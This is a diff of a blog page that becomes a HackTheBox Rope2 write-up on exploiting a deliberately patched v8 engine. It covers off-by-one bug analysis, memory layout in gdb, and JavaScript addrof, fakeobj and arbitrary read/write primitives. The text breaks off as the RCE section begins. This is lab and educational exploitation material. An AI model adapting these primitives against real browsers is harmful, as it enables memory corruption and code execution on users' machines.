@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: pwn | cppblog</title>
+  <title>HackTheBox Rope2 - Part1 | cppblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cppblog">
-<meta property="og:url" content="http://example.com/tags/pwn/index.html">
+  <meta name="description" content="Exploiting a patched version of the v8 engine for RCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Rope2 - Part1">
+<meta property="og:url" content="http://example.com/2021/07/07/htb-rope2/index.html">
 <meta property="og:site_name" content="cppblog">
+<meta property="og:description" content="Exploiting a patched version of the v8 engine for RCE">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/07/07/htb-rope2/exp.png">
+<meta property="article:published_time" content="2021-07-07T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-07-11T08:09:03.325Z">
 <meta property="article:author" content="cp">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="browser">
+<meta property="article:tag" content="v8">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/07/htb-rope2/exp.png">
   
     <link rel="alternative" href="/atom.xml" title="cppblog" type="application/atom+xml">
   
@@ -142,36 +152,121 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-htb-rope2" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/07/htb-rope2/" class="archive-article-date">
-  	<time datetime="2021-07-07T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-07</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/07/htb-rope2/">HackTheBox Rope2 - Part1</a>
+    <h1 class="article-title" itemprop="name">
+      HackTheBox Rope2 - Part1
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/07/07/htb-rope2/" class="archive-article-date">
+  	<time datetime="2021-07-07T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Exploiting a patched version of the v8 engine for RCE</p>
+<span id="more"></span>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><strong>OS: Ubuntu 20.04 VM<br>Tools: gef<br>Target: patched v8 engine</strong></p>
+<p>I shall assume that the reader has already downloaded and set up the relevant environment.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">osboxes@osboxes:~/Desktop/htb/rope2/v8$ ls</span><br><span class="line">7410f6809dd33e317f11f39ceaebaba9a88ea970.diff  CODE_OF_CONDUCT.md   gni             LICENSE.strongtalk  PPC_OWNERS    testing</span><br><span class="line">AUTHORS                                        codereview.settings  include         LICENSE.v8          PRESUBMIT.py  third_party</span><br><span class="line">base                                           COMMON_OWNERS        infra           LICENSE.valgrind    README.md     tools</span><br><span class="line">build                                          custom_deps          INFRA_OWNERS    MIPS_OWNERS         S390_OWNERS   WATCHLISTS</span><br><span class="line">BUILD.gn                                       DEPS                 INTL_OWNERS     out                 samples</span><br><span class="line">build_overrides                                docs                 LICENSE         out.gn              src</span><br><span class="line">buildtools                                     ENG_REVIEW_OWNERS    LICENSE.fdlibm  OWNERS              <span class="built_in">test</span></span><br><span class="line">osboxes@osboxes:~/Desktop/htb/rope2/v8$ </span><br></pre></td></tr></table></figure>
+<h2 id="Patch-Analysis"><a href="#Patch-Analysis" class="headerlink" title="Patch Analysis"></a>Patch Analysis</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayGetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	<span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(len)));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+BUILTIN(ArraySetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">+	int arg_count = args.length();</span><br><span class="line">+	<span class="keyword">if</span> (arg_count != <span class="number">2</span>) <span class="comment">// first value is always this</span></span><br><span class="line">+	&#123;</span><br><span class="line">+		<span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+	&#125;</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	Handle&lt;<span class="built_in">Object</span>&gt; value;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, <span class="attr">Object</span>::ToNumber(isolate, args.atOrUndefined(isolate,<span class="number">1</span>)));</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	elements.set(len,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">+	<span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+<p>The vulnerability occurs because we are reading and writing to one index past the end of the array.<br>For example if array a = [1,2,3], length of the array will be 3.<br>However, the last element in the array is actually a[2], thus a[3] will be an out of bounds access.</p>
+<p>By abusing this we can cause a type confusion and gain arbitrary read and write.</p>
+<h2 id="Arrays-in-v8"><a href="#Arrays-in-v8" class="headerlink" title="Arrays in v8"></a>Arrays in v8</h2><p>This is how arrays are represented in v8:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">       A JSArray object                      A FixedArray object</span><br><span class="line">+-----------------------------+       +------------------------------+</span><br><span class="line">|                             |       |                              |</span><br><span class="line">|         Map Pointer         |   +--&gt;+         Map Pointer          |</span><br><span class="line">|                             |   |   |                              |</span><br><span class="line">+-----------------------------+   |   +------------------------------+</span><br><span class="line">|                             |   |   |                              |</span><br><span class="line">|      Properties Pointer     |   |   |     Backing Store Length     |</span><br><span class="line">|                             |   |   |                              |</span><br><span class="line">+-----------------------------+   |   +------------------------------+</span><br><span class="line">|                             |   |   |                              |</span><br><span class="line">|       Elements Pointer      +---+   |          0x00000002          | index 0</span><br><span class="line">|                             |       |                              |</span><br><span class="line">+-----------------------------+       +------------------------------+</span><br><span class="line">|                             |       |                              |</span><br><span class="line">|        Array Length         |       |          0x00000004          | index 1</span><br><span class="line">|                             |       |                              |</span><br><span class="line">+-----------------------------+       +------------------------------+</span><br><span class="line">|                             |       |                              |</span><br><span class="line">| Other unimportant fields... |       |          0x00000006          | index 2</span><br><span class="line">|                             |       |                              |</span><br><span class="line">+-----------------------------+       +------------------------------+</span><br><span class="line">                                      |                              |</span><br><span class="line">                                      |          0x00000008          | index 3</span><br><span class="line">                                      |                              |</span><br><span class="line">                                      +------------------------------+</span><br></pre></td></tr></table></figure>
+<p>This diagram can be found here <a target="_blank" rel="noopener" href="https://www.elttam.com/blog/simple-bugs-with-complex-exploits/">https://www.elttam.com/blog/simple-bugs-with-complex-exploits/</a>, and I think it’s a really clear representation.</p>
+<p>The important point is that we are returned a JSArray object, but when we do array[0] it uses the element pointer to locate the FixedArray object, where the real elements are stored 8 bytes into it.</p>
+<p>The Map Pointer determines the type of array(whether it is an array of floats or an array of objects).</p>
+<p>For floats, the exact value is stored in the FixedArray, whereas for objects, a pointer to the actual object is stored in the FixedArray.</p>
+<p>Let’s look at them in gdb, with the gef extension.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">osboxes@osboxes:~/Desktop/htb/rope2/v8/out.gn/x64.release$ rlwrap gdb -q ./d8 </span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./d8...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./d8)</span><br><span class="line">gef➤  r --allow-natives-syntax</span><br><span class="line">Starting program: /home/osboxes/Desktop/htb/rope2/v8/out.gn/x64.release/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff7221700 (LWP 2559)]</span><br><span class="line">[New Thread 0x7ffff6a20700 (LWP 2560)]</span><br><span class="line">[New Thread 0x7ffff621f700 (LWP 2561)]</span><br><span class="line">V8 version 8.5.0 (candidate)</span><br><span class="line">d8&gt; </span><br></pre></td></tr></table></figure>
+<p>I ran gdb with <code>rlwrap</code> so I can use the arrow keys.</p>
+<h3 id="Array-of-floats"><a href="#Array-of-floats" class="headerlink" title="Array of floats"></a>Array of floats</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; arr &#x3D; [1.1, 1.2, 1.1];</span><br><span class="line">[1.1, 1.2, 1.1]</span><br><span class="line">d8&gt; %DebugPrint(arr);</span><br><span class="line">0x3c5e08085e41 &lt;JSArray[3]&gt;</span><br><span class="line">[1.1, 1.2, 1.1]</span><br><span class="line">d8&gt;</span><br></pre></td></tr></table></figure>
+<p><code>%DebugPrint</code> shows us the address of the JSArray object in memory.<br>Due to pointer tagging, the least significant bit of every pointer is always set, so we have to minus 1 when we inspect that address.</p>
+<p>Ctrl-C to break in <code>d8</code>, and we can view the JSArray object in memory.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;16wx 0x3c5e08085e41-1</span><br><span class="line">0x3c5e08085e40: 0x08241909      0x080406e9      0x08085e21      0x00000006</span><br></pre></td></tr></table></figure>
+<p>Compare this to the diagram above, the first address is the map pointer, second is properties, third is element and fourth is length.</p>
+<p>Length is 6 because immediate small integers(SMI) in v8 are left shifted by 1.<br>Since our float array has 3 values, left shifted by 1 will give us 6.</p>
+<p>The memory addresses are also only 32bit, because of pointer compression.<br>Pointer compression basically chops off the upper bits of the address, known as the base value and stores it in some register.</p>
+<p>This approach makes v8 more memory efficient, because all addresses have this common base value and there’s no need to store it over and over again.</p>
+<p>When we inspect an address in memory we have to add it manually, and minus 1.<br>Let’s inspect the actual FixedArray object.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;16wx 0x3c5e08085e21-1</span><br><span class="line">0x3c5e08085e20: 0x08040a3d      0x00000006      0x9999999a      0x3ff19999</span><br><span class="line">0x3c5e08085e30: 0x33333333      0x3ff33333      0x9999999a      0x3ff19999</span><br><span class="line">0x3c5e08085e40: 0x08241909      0x080406e9      0x08085e21      0x00000006</span><br></pre></td></tr></table></figure>
+<p>We see it also has its own map pointer and length, followed by the values. The cool thing is that this FixedArray object is directly before the JSArray object that points to it in memory.</p>
+<p>So if we perform a <code>GetLastElement()</code> on the JSArray object returned to us, we will be able to get a value with the lower 32 bits being the map pointer, and the higher 32 bits being the properties pointer of the JSArray object.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; arr.GetLastElement()</span><br><span class="line">4.73859563718219e-270</span><br><span class="line">d8&gt; </span><br></pre></td></tr></table></figure>
+<p>The value is returned as a float, which isn’t really intuitive to look at, so let’s make some helper functions to convert the datatypes.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// Helper functions to convert between float and integer primitives</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>); <span class="comment">// 8 byte array buffer</span></span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) = float</span></span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> BigInt(u64_buf[<span class="number">0</span>]) + (BigInt(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>); <span class="comment">// Watch for little endianness</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) = BigInt</span></span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoh</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + ftoi(val).toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We can use these functions in d8 by running <code>r --allow-natives-syntax --shell exploit.js</code> on startup, assuming you named your file exploit.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; ftoh(arr.GetLastElement())</span><br><span class="line">&quot;0x80406e908241909&quot;</span><br><span class="line">d8&gt; </span><br></pre></td></tr></table></figure>
+<p>Now we get the leaked map of a float array.</p>
+<h3 id="Arrays-of-objects"><a href="#Arrays-of-objects" class="headerlink" title="Arrays of objects"></a>Arrays of objects</h3><p>Arrays of objects are largely similar to arrays of floats in memory, the only difference is that instead of the actual objects, the FixedArray object contains pointers to the objects in the array.</p>
+<p>Thus I’ll not be showing them in memory here, but I encourage you to play around with them in d8.</p>
+<h2 id="Addrof-and-Fakeobj-primitives"><a href="#Addrof-and-Fakeobj-primitives" class="headerlink" title="Addrof and Fakeobj primitives"></a>Addrof and Fakeobj primitives</h2><p>These are two common primitives used in browser exploitation.</p>
+<p>Addrof allows you to get the address of any object in memory, while Fakeobj returns you a reference to an object anywhere in memory, where you can read and write to.</p>
+<p>The idea here is that since we are able to set the map pointer of any array with <code>SetLastElement()</code>, we can cause the arrays to behave differently while retrieving data.</p>
+<p>Before we start coding the primitives, let’s save the map pointer values for arrays of floats and arrays of objects.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fl_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> fl_map = fl_arr.GetLastElement();</span><br><span class="line"><span class="keyword">var</span> obj_map = itof(ftoi(fl_map)+<span class="number">0x50n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]OBJ MAP: &quot;</span> + ftoh(obj_map));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]FLOAT MAP: &quot;</span> + ftoh(fl_map));</span><br></pre></td></tr></table></figure>
+<p>There’s no way for us to get the map pointer for arrays of objects because only their pointer is stored, and the pointer is compressed to 32bits. Hence when we do a <code>GetLastElement()</code>, we will get the properties pointer and the element pointer instead.</p>
+<p>Fortunately, it seems like the object map pointer is always 0x50 bytes larger than the float map pointer, so we can hardcode that.</p>
+<h3 id="Addrof-Primitive"><a href="#Addrof-Primitive" class="headerlink" title="Addrof Primitive"></a>Addrof Primitive</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">	arr.SetLastElement(obj_map);</span><br><span class="line">	arr[<span class="number">0</span>] = in_obj;</span><br><span class="line">	arr.SetLastElement(fl_map);</span><br><span class="line">	<span class="keyword">let</span> addr = arr[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">return</span> ftoi(addr) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We first create an array of floats, then we change its map pointer to the map pointer for an array of objects. Now, v8 will treat it as an array of objects. When we update the first element in the array to be an arbitrary object, the pointer(a pointer to an object contains the address of the object) to that object is stored in the FixedArray.</p>
+<p>Now we change the map pointer back to be of a float array, and we can retrieve the address of the object.</p>
+<p>We only care about the lower 32 bits, because that’s the 32 bit compressed address of the object in memory.</p>
+<h3 id="Fakeobj-Primitive"><a href="#Fakeobj-Primitive" class="headerlink" title="Fakeobj Primitive"></a>Fakeobj Primitive</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">	arr[<span class="number">0</span>] = itof(addr);</span><br><span class="line">	arr.SetLastElement(obj_map);</span><br><span class="line">	<span class="keyword">let</span> fake = arr[<span class="number">0</span>];</span><br><span class="line">	arr.SetLastElement(fl_map);</span><br><span class="line">	<span class="keyword">return</span> fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>This is also pretty straightforward. By exploiting a type confusion, we are returned a reference to an arbitrary object in memory, located at the <code>addr</code> argument we specify.</p>
+<p>The question now is how do we use these for arbitrary read/write.</p>
+<h2 id="Arbitrary-read-write"><a href="#Arbitrary-read-write" class="headerlink" title="Arbitrary read/write"></a>Arbitrary read/write</h2><p>The trick here is to create a fake JSArray object, just like the one returned to us when we define an array in javascript.</p>
+<p>When we read or write to that fake array, we will be able to gain arbitrary read/write.</p>
+<p>First let’s create an array, with the first element set as the float map.<br>Later we will convince d8 to believe that the first element in our array is the map pointer of a JSArray object.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; arr &#x3D; [fl_map, 1.1, 1.2, 1.3];</span><br><span class="line">[4.73859563718219e-270, 1.1, 1.2, 1.3]</span><br></pre></td></tr></table></figure>
+<p>Let’s see how this array looks like in memory.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;16wx 0x3cb208088609-1</span><br><span class="line">0x3cb208088608: 0x08241909      0x080406e9      0x080885e1      0x00000008</span><br><span class="line">0x3cb208088618: 0x08241959      0x080406e9      0x08088671      0x00000008</span><br><span class="line">0x3cb208088628: 0x08043521      0x08212351      0x080401f5      0x00000008</span><br><span class="line">0x3cb208088638: 0x0824195b      0x08212145      0x0824186b      0x0821236d</span><br><span class="line">gef➤  x&#x2F;16wx 0x3cb2080885e1-1</span><br><span class="line">0x3cb2080885e0: 0x08040a3d      0x00000008      0x08241909      0x080406e9</span><br><span class="line">0x3cb2080885f0: 0x9999999a      0x3ff19999      0x33333333      0x3ff33333</span><br><span class="line">0x3cb208088600: 0xcccccccd      0x3ff4cccc      0x08241909      0x080406e9</span><br><span class="line">0x3cb208088610: 0x080885e1      0x00000008      0x08241959      0x080406e9</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure>
+<p>From the above output, we see that the map pointer we supplied is 32 bytes lower than the actual map pointer(which is also the address of the JSArray object returned to us).</p>
+<p>So let’s set our fake object to be exactly 32 bytes smaller than the address of our array.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_arr = [fl_map, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(fake_arr) - <span class="number">0x20n</span>);</span><br></pre></td></tr></table></figure>
+<p>We can’t do this in d8, because it will try to locate the FixedArray object of our fake object, which is now just some float value that we passed in.</p>
+<p>Now how do we achieve arbitrary read/write?</p>
+<p>If you remember from the diagram, the JSArray object will have an elements pointer pointing to a FixedArray object that stores the actual elements.</p>
+<p>So if we change that pointer to an arbitrary address of our choosing, when we call fake[0] we are returned whatever is at the arbitrary address plus 8 bytes.</p>
+<p>The elements pointer in this case will be the second element of our <code>fake_arr</code>.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fake_arr[<span class="number">1</span>] = itof((<span class="number">8n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">	<span class="keyword">return</span> fake[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fake_arr[<span class="number">1</span>] = itof((<span class="number">8n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">	fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>By modifying the second element, we are also changing the length attribute, so we must take that into consideration.</p>
+<p>I used 8 as the length because our array has 4 elements, and 4 left shifted by 1 is 8.</p>
+<p>With this we are able to read/write freely in memory.</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>The problem now is, how do we turn this into arbitrary code execution.</p>
+<p>Through reading other articles I learnt that when you create a <code>webassembly</code> function in v8, v8 somehow allocates a page that has <code>RWX</code> privileges.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://wasdk.github.io/WasmFiddle/</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span 